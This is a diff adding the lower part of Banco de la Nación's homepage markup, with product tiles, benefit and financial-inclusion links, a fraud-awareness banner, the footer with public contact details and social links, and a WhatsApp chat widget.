+                        <div class="txt">
+                            <p>Préstamo BN</p>
+                        </div>
+                    </a>
+                    <a href="clientes/creditos-hipotecarios/credito-hipotecario-bn.asp" class="productos">
+                        <div class="img">
+                            <img src="img/productos/credito-hipotecario.png" alt="imagen de Crédito Hipotecario">
+                        </div>
+                        <div class="txt">
+                            <p>Crédito Hipotecario</p>
+                        </div>
+                    </a>
+                    
+                    <a href="clientes/tarjetas/tarjeta-credito-bn.asp" class="productos">
+                        <div class="img">
+                            <img src="img/productos/tarjeta-credito.png" alt="imagen de Tarjeta de crédito">
+                        </div>
+                        <div class="txt">
+                            <p>Tarjeta de crédito</p>
+                        </div>
+                    </a>
+                    <a href="clientes/seguros/proteccion-tarjeta.asp" class="productos">
+                        <div class="img">
+                            <img src="img/productos/seguro-tarjeta-debito.png" alt="imagen de Seguro para tarjetas BN">
+                        </div>
+                        <div class="txt">
+                            <p>Seguro para tarjetas</p>
+                        </div>
+                    </a>
+					<a href="clientes/seguros/cuota-protegida.asp" class="productos">
+                        <div class="img">
+                            <img src="img/productos/seguro-cuota-protegida.png" alt="imagen de Seguro cuota protegida">
+                        </div>
+                        <div class="txt">
+                            <p>Seguro cuota protegida</p>
+                        </div>
+                    </a>
+                    <a href="clientes/seguros/oncologico.asp" class="productos">
+                        <div class="img">
+                            <img src="img/productos/seguro-oncologico.png" alt="imagen de Seguro Oncológico">
+                        </div>
+                        <div class="txt">
+                            <p>Seguro Oncológico</p>
+                        </div>
+                    </a>
+                    <a href="clientes/seguros/sepelio.asp" class="productos">
+                        <div class="img">
+                            <img src="img/productos/seguro-sepelio.png" alt="imagen de Seguro de Sepelio">
+                        </div>
+                        <div class="txt">
+                            <p>Seguro de Sepelio</p>
+                        </div>
+                    </a>
+                </div>
+            </div>
+            <button class="prev-btn" title="boton anterior">
+                <svg height="28px" viewBox="0 0 24 24" width="28px">
+                    <path d="M0 0h24v24H0z" fill="none"></path>
+                    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"></path>
+                </svg>
+            </button>
+            <button class="next-btn" title="boton siguiente">
+                <svg height="28px" viewBox="0 0 24 24" width="28px">
+                    <path d="M0 0h24v24H0z" fill="none"></path>
+                    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"></path>
+                </svg>
+            </button>
+        </div>
+    </div>
+</div><div class="ctn-items-div">
+    <div class="ctn-items">
+
+        <div class="items-div">
+            <h2 class="title">Conoce BN Beneficios</h2>
+            <a target="_blank" href="https://www.bn.com.pe/clientes/bnbeneficios.asp" class="div-item descuentos-actual">
+                <div class="ctn-item-actual-txt">
+                    <p>Aprovecha las promociones que te ofrece tu tarjeta Débito BN</p>
+                </div>
+                <div class="ctn-item-actual-img">
+                    <img src="img/beneficios/descuentos.png" alt="Imagen descuentos">
+                </div>
+            </a>
+        </div>
+
+        <div class="items-div">
+            <h2 class="title">Inclusión Financiera</h2>
+            <a target="_blank" href="inclusion-financiera/inclusion-financiera.asp" class="div-item descuentos-actual">
+                <div class="ctn-item-actual-txt">
+                    <p>Promoviendo servicios financieros de calidad para todos</p>
+                </div>
+                <div class="ctn-item-actual-img">
+                    <img src="img/inclusion-financiera-bn.png" alt="Imagen Inclusión Financiera">
+                </div>
+            </a>
+        </div>
+
+    </div>
+</div>
+<div class="ctn-noticias mw-1366">
+    <div class="noticias-aclaracion">
+        <div class="noticias">
+            <div class="noticias-title">
+                <h2>Noticias</h2>
+                <a  class="ctn-vermas" href="noticias/noticias-2025.asp">
+                    <p class="ver-mas">Ver más </p>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+                    </svg>
+                </a>
+            </div>
+            
+            <div class="noticias-items">
+            </div>
+
+        </div>
+        <div class="ctn-aclaracion">
+            <div class="aclaracion">
+                
+                <img src="/altoalfraude/img/altoalfraude.png" alt="Alto al fraude">
+				<div class="aclaracion-titulo">
+                <p><strong>Tu seguridad es primero,</strong><br> aprende a detectar fraudes y estafas</p>
+				</div>
+                <div class="aclaracion-btn">
+                    <a  href="/altoalfraude/alto-fraude.asp" target="_blank" class="acl-btn">
+                        <p>Infórmate aquí</p>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+        
+        <div class="pie-pagina">
+            <div class="pie-pagina-ctn">
+    <div class="pp-txt">
+        <div class="nosotros">
+            <div class="nosotros-enlaces-title pp-txt-title" data-target="nosotros-enlaces">
+                <p class="pp-title">Nosotros</p>
+                <svg viewBox="0 0 24 24">
+                    <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+                </svg>
+            </div>
+            <div class="nosotros-enlaces pp-txt-enlaces">
+                <a target="_blank" href="/nosotros/quienes-somos.asp" class="pp-enlaces">¿Quiénes somos?</a>
+                <a target="_blank" href="/nosotros/directorio-funcionarios.asp" class="pp-enlaces">Directorio de
+                    Funcionarios</a>
+                <a target="_blank" href="/integridad/integridad.asp" class="pp-enlaces">Integridad BN</a>
+                <a href="/nosotros/gobierno-corporativo.asp" class="pp-enlaces">Buen Gobierno corporativo</a>
+				<a href="/nosotros/memoria-anual.asp" class="pp-enlaces">Memoria Anual</a>
+                <a href="/inclusion-financiera/inclusion-financiera.asp" class="pp-enlaces">Inclusión Financiera</a>
+                <!--<a target="_blank" href="/cineclub/cineclub.pdf" class="pp-enlaces">Cine Club BN</a>-->
+                <a target="_blank" href="/accesibilidad/guia-accesibilidad.asp" class="pp-enlaces">Accesibilidad</a>
+            </div>
+        </div>
+        <hr class="enlaces-linea">
+
+        <div class="informacion">
+            <div class="informacion-title pp-txt-title" data-target="informacion-enlaces">
+                <p class="pp-title">Información de interés</p>
+                <svg viewBox="0 0 24 24">
+                    <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+                </svg>
+            </div>
+            <div class="informacion-enlaces pp-txt-enlaces">
+                <a target="_blank" href="/cronograma-pagos/cronograma-pagos.asp" class="pp-enlaces">Cronograma de
+                    pagos</a>
+                <a href="/tasas-comisiones/tarifario.asp" class="pp-enlaces">Tasas y Comisiones</a>
+				<a href="/inclusion-financiera/seguridad.asp#financiera" class="pp-enlaces">Seguridad</a>
+                <a target="_blank" href="https://bancaporinternet.bn.com.pe/CCIConsulta/Inicio" class="pp-enlaces">Ver
+                    tu Código Interbancario</a>
+                <a target="_blank" href="tipodecambio.asp" class="pp-enlaces">Tipo de Cambio</a>
+                <a target="_blank" href="https://www.bn.com.pe/factura-electronica.asp" class="pp-enlaces">Facturación
+                    Electrónica</a>
+                <a target="_blank" href="https://fideicomisos.bn.com.pe/Fiwe_Internet/"
+                    class="pp-enlaces">Fideicomisos</a>
+                <a href="/atencion-cliente/enlaces-interes.asp" class="pp-enlaces">Enlaces de interés</a>
+            </div>
+        </div>
+
+        <hr class="enlaces-linea">
+
+        <div class="atencion">
+            <div class="atc-presencial">
+                <div class="atc-presencial-title pp-txt-title" data-target="atc-presencial-enlaces">
+                    <p class="pp-title">Canales presenciales</p>
+                    <svg viewBox="0 0 24 24">
+                        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+                    </svg>
+                </div>
+                <div class="atc-presencial-enlaces pp-txt-enlaces">
+                    <a href="/canales-atencion/agentes-lima-metropolitana.asp" class="pp-enlaces">Agentes</a>
+                    <a href="/canales-atencion/cajero-lima-metropolitana.asp" class="pp-enlaces">Cajeros</a>
+                    <a href="/canales-atencion/agencia-lima-metropolitana.asp" class="pp-enlaces">Agencias</a>
+                </div>
+            </div>
+            <hr class="enlaces-linea ocultar-linea">
+            <div class="atc-cliente">
+                <div class="atc-cliente-title pp-txt-title" data-target="atc-clientes-enlaces">
+                    <p class="pp-title">Contáctanos</p>
+                    <svg viewBox="0 0 24 24">
+                        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+                    </svg>
+                </div>
+                <div class="atc-clientes-enlaces pp-txt-enlaces">
+                    <a href="/atencion-cliente/atencion-cliente.asp" class="pp-enlaces">Atención al Cliente</a>
+                </div>
+            </div>
+            <hr class="enlaces-linea ocultar-linea">
+        </div>
+    </div>
+
+    <div class="servicio">
+        <div class="svc-cliente">
+            <div class="svc-cliente-title">
+                <p class="pp-title">
+                    Servicio al Cliente
+                </p>
+            </div>
+
+            <div class="svc-cliente-txt">
+                <p>Consultas, uso en el extranjero y bloqueo de tarjetas las 24 horas.</p>
+                <p>Línea gratuita: <strong> 0800-10700</strong></p>
+                <p>Teléfonos: <strong>01-440-5305 / 01-442-4470 / 1820</strong></p>
+            </div>
+
+            <a target="_blank" href="https://www.bn.com.pe/reclamos.asp" class="libro-reclamacion">
+                <img src="img/reclamos.png" alt="imagen libro de reclamaciones">
+                <p>Libro de Reclamaciones</p>
+            </a>
+        </div>
+        
+        <div class="redes-sociales">
+            <p>Siguenos:</p>
+            <div class="redes-sociales-icons">
+                <a href="https://www.facebook.com/BancoDeLaNacion" class="iconos-redes-sociales">
+                    <div>
+                        <img src="/img/redes/facebook.png" alt="Facebook">
+                    </div>
+                </a>
+
+                <a class="iconos-redes-sociales" href="https://x.com/BancodelaNacion" title="X" target="_blank">
+                    <div>
+                        <img src="/img/redes/x.png" alt="X">
+                    </div>
+                </a>
+
+                <a class="iconos-redes-sociales" href="https://www.youtube.com/user/BNPeru" title="Youtube"
+                    target="_blank">
+                    <div>
+                        <img src="/img/redes/youtube.png" alt="Youtube">
+                    </div>
+                </a>
+
+                <a class="iconos-redes-sociales" href="https://www.instagram.com/bancodelanacionperu/" title="Instagram"
+                    target="_blank">
+                    <div>
+                        <img src="/img/redes/instagram.png" alt="Instagram">
+                    </div>
+                </a>
+
+                <a class="iconos-redes-sociales" href="https://pe.linkedin.com/company/bancodelanacionperu"
+                    title="Linkedin" target="_blank">
+                    <div>
+                        <img src="/img/redes/linkedin.png" alt="Linkedin">
+                    </div>
+                </a>
+
+                <a class="iconos-redes-sociales" href="https://www.tiktok.com/@bancodelanacionperu" title="Tiktok"
+                    target="_blank">
+                    <div>
+                        <img src="/img/redes/tiktok.png" alt="Tiktok">
+                    </div>
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+        </div>
+        
+        <footer>
+    <div class="footer-ctn">
+        <div class="f-c1">
+            <p class="f-title">Banco de la Nación | Ministerio de Economía y Finanzas | Perú</p>
+            <p>Oficina principal: <a target="_blank" href="/canales-atencion/centralbn.asp">Av. Javier Prado Este 2499, San Borja</a></p>
+            <p>Atención en oficina principal: lunes a viernes de 08:30 a 17:30, refrigerio de 13:00 a 14:00</p>
+            <p>Mesa de partes presencial: Av. De La Arqueología 120, San Borja, atención: lunes a viernes de 8:30 a 16:30</p>
+            <a target="_blank" href="/mesa-de-partes/mesa-de-partes.asp">Mesa de partes digital</a>
+            <p>Central telefónica administrativa 01 519 2000</p>
+        </div>
+        <div class="f-c2">
+            <p class="f-title">Funcionarios responsables del:</p>
+            <span class="f-title"><a target="_blank" href="https://www.bn.com.pe/transparenciabn/archivos/responsables-transparencia-bn.pdf">Portal de Transparencia y Entrega de Información</a></span>
+            <p id="fecha">Última actualización: 21 de agosto del 2024</p>
+        </div>
+    </div>
+</footer>
+<div class="derechos-a">
+    © BN | Todos los derechos reservados, Banco de la Nación - RUC 20100030595
+</div>
+        
+    </div>
+    <div class="whatsapp-flotante">
+    <div class="ctn-wp-flotante">
+        <div class="whatsapp-flotante-texto">
+            Hola, soy Quina.
+        </div>
+        <a class="whatsapp-flotante-img" target="_blank" href="https://wa.me/51966216942?text=Hola,%20quiero%20hacer%20una%20consulta">
+            <img src="/images/quina.png" alt="Asesora Quina" width="80px" height="80px">
+        </a>
+    </div>
+</div>
+
+</body>
+
+</html>
